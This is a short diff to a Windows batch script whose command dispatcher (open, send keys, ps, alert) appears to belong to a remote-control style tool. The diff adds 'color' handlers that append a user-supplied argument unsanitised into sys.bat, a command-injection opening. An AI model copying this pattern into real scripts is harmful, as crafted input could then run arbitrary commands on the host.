@@ -175,6 +175,30 @@ if "!cmd:~0,5!"=="open[" call :open_cmd
 if "!cmd:~0,5!"=="skey[" call :sendKey
 if "!cmd:~0,3!"=="ps[" call :ps
 if "!cmd:~0,6!"=="alert[" call :alert
+if "!cmd:~0,6!"=="color[" call :mainColor
+if "!cmd:~0,7!"=="colour[" call :mainColour
+exit /b
+
+:mainColour
+set cmdc=!cmd:~7,-1!
+(
+@echo off
+type sys.bat
+echo color !cmdc!
+)>sys2.bat
+del "sys.bat"
+ren "sys2.bat" "sys.bat"
+exit /b
+
+:mainColor
+set cmdc=!cmd:~6,-1!
+(
+@echo off
+type sys.bat
+echo color !cmdc!
+)>sys2.bat
+del "sys.bat"
+ren "sys2.bat" "sys.bat"
 exit /b
 
 :alert
